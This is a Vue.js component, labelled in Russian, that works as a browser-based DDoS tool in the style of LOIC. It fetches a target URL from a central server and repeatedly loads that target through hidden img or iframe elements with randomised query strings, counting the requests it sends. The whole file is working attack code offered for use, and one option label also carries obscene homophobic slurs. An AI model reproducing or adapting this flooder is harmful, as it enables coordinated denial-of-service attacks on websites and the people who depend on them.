<template>
  <div id="home">
    <div id="ddos">
      <div id="meta">
        <div class="point">
          <p>Цель: <a :href="point">{{ point }}</a></p>
        </div>
        <div class="counter">
          <p>Запросы: {{ counter }}</p>
        </div>
      </div>
      <div id="loic">
        <div class="mode">
          <div class="interval">
            <label>Интервал (милисекунды): <input type="number" v-model.number="interval"></label>
          </div>
          <div class="requestsPerPass">
            <label>Запросов за проход: <input type="number" v-model.number="requestsPerPass"></label>
          </div>
          <div>
            <select v-model='mode'>
              <option value='img'>Image (лайтовая хуйня, НЕ РАБОТАЕТ У ХРОМОБЛЯДКОВ СРАНЫХ ЕБАЛ ВАС В РОТ ПИДОРАСЫ)</option>
              <option value='iframe'>Iframe (пежже дудосит)</option>
            </select>
          </div>
          <button v-if='!started' v-on:click="start()">Старт</button>
          <button v-else v-on:click="stop()">Стоп</button>
        </div>
        <img class="hidden" v-if='mode == "img"' v-for='addr in addrs' :src="addr" :alt="addr" :title="addr">
        <iframe class="hidden" v-if="mode == 'iframe'" v-for='addr in addrs' :src="addr"></iframe>
      </div>
    </div>
    <Chat></Chat>
  </div>
</template>

<script>
  import Chat from '../components/Chat.vue'
  import $ from 'jquery'
  export default {
    name: 'Home',
    data () {
      return {
        point: "",
        counter: Number(),
        started: false,
        interval: 500,
        addrs: [],
        requestsPerPass: 1,
        mode: 'img'
      }
    },
    components: { Chat },
    methods: {
      fetchPoint () {
        var that = this
        var vm = that.$root
        $.ajax({
          url: vm.config.api,
          data: {
            method: 'point'
          },
          success (data) {
            if (data.success) {
              that.point = data.success
            }
            else {
              console.error(data.error)
            }
          }
        })
      },
      newRandom () {
        let addrs = []
        let delimitter = /\?/g.test(this.point) ? '&' : '?'
        for (let i=0; i < this.requestsPerPass; i++) {
          addrs.push(`${this.point}${delimitter}PVD_RULEZZ=${random()}&weAre=https://thirdwave.tk/`)
        }
        this.addrs = this.addrs.concat(addrs)
      },
      start () {
        var that = this
        this.started = true
        window.attack = setInterval(() => {
          that.newRandom()
          that.counter += that.requestsPerPass
        }, that.interval)
      },
      stop () {
        this.started = false
        clearInterval(window.attack)
      },
      loadPage () {
        this.fetchPoint()
      }
    },
    created () {
      this.loadPage()
    }
  }
</script>
